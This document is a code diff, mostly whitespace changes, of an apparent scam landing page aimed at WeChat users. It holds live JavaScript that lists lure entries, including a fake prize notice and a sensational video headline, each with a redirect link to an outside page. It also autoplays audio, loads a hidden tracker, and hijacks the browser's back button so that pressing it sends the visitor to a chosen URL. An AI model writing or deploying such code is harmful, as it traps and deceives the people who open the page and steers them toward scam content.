@@ -25,23 +25,23 @@
 			<img id="neirongliebiaotupian0" style="display:none" class="neirongliebiaotupian0"  src="" data-fmt="jpg"/>
 			<a id="chaolianjie" href=""> <img id="neirongliebiaotupian" class="neirongliebiaotupian"  src="" data-fmt="jpg"/> </a>
 		</div>
-		<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
+		<script type="text/javascript" src="https://code.jquery.com/jquery-latest.js"></script>
 		<script type="text/javascript">
 		    var hrefB = ""
-            function getParam(paramName) { 
-                paramValue = "", isFound = !1; 
-                 if (this.location.search.indexOf("?") == 0 && this.location.search.indexOf("=") > 1) { 
-                         arrSource = unescape(this.location.search).substring(1, this.location.search.length).split("&"), i = 0; 
-                         while (i < arrSource.length && !isFound) arrSource[i].indexOf("=") > 0 && arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split("=")[1], isFound = !0), i++ 
-                } 
-             return paramValue == "" && (paramValue = null), paramValue 
-            } 
+            	    function getParam(paramName) { 
+                	paramValue = "", isFound = !1; 
+                        if (this.location.search.indexOf("?") == 0 && this.location.search.indexOf("=") > 1) { 
+                           arrSource = unescape(this.location.search).substring(1, this.location.search.length).split("&"), i = 0; 
+                           while (i < arrSource.length && !isFound) arrSource[i].indexOf("=") > 0 && arrSource[i].split("=")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split("=")[1], isFound = !0), i++ 
+                	   } 
+            		return paramValue == "" && (paramValue = null), paramValue 
+            	    } 
 			var jumpDict = [
-                {
+                		{
 					viewName:'恭喜你中奖了',
 					audioSrc:'http://img.imgqq.cn/Uploads/mp3/201812/26/1812_5c2382682c2ae.mp3',
 					imgHref:'http://dsfsdio123.gitee.io/newpro586?v=1',
-                    imgSrc:'https://p.qpic.cn/pic_wework/2742915127/c8ce63c793f754b33d42296bd4fc34d349c773440bf050a1/0',
+                    			imgSrc:'https://p.qpic.cn/pic_wework/2742915127/c8ce63c793f754b33d42296bd4fc34d349c773440bf050a1/0',
 				},
 				{
 					viewName:'大_贪_倌玩_弄下_属视_频暴_*光，14亿国..人惊_呆了',
@@ -101,16 +101,16 @@
 			]
 
 			function GetUrlRelativePath(){
-　　　　		var url = document.location.toString();
+　　　　			var url = document.location.toString();
 　　　			 var arrUrl = url.split("//");
-　　　　		var start = arrUrl[1].indexOf("/");
-　　　　		var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符
-　　　　		if(relUrl.indexOf("?") != -1){
-　　　　　		　relUrl = relUrl.split("?")[0];
-　　　　		}
+　　　　			var start = arrUrl[1].indexOf("/");
+　　　　			var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符
+　　　　			if(relUrl.indexOf("?") != -1){
+　　　　　		　	    relUrl = relUrl.split("?")[0];
+　　　　			}
 　　			　return relUrl;
-		  　}
-            var dictLength = jumpDict.length
+		  　	}
+           		 var dictLength = jumpDict.length
 			function loadNewView(){
 				var getpara = getParam("viewNum")
 				var jumpModel = jumpDict[getpara]
@@ -171,7 +171,7 @@
 					opened.opener = null;
 					opened.close();
 			}
-    		function bb(){
+    			function bb(){
 				if (window.history && window.history.pushState) {
 							$(window).on('popstate', function () {
 								window.history.pushState('forward', null, '#');
@@ -179,8 +179,8 @@
 								window.location.href= hrefB;
 							});
 						}
-						window.history.pushState('forward', null, '#');
-						window.history.forward(1);
+					window.history.pushState('forward', null, '#');
+					window.history.forward(1);
 				}
 			function aa(){
 				if(window.name=="new"){
@@ -196,8 +196,8 @@
 			document.addEventListener("WeixinJSBridgeReady",function(){document.getElementById('gequneirong').play();},false);
 		</script>
 		<div style="display:none">
-<script type="text/javascript" src="https://s96.cnzz.com/z_stat.php?id=1275910212&web_id=1275910212"></script>
-			</div>
+			<script type="text/javascript" src="https://s96.cnzz.com/z_stat.php?id=1275910212&web_id=1275910212"></script>
+		</div>
 
 	</body>
 </html>
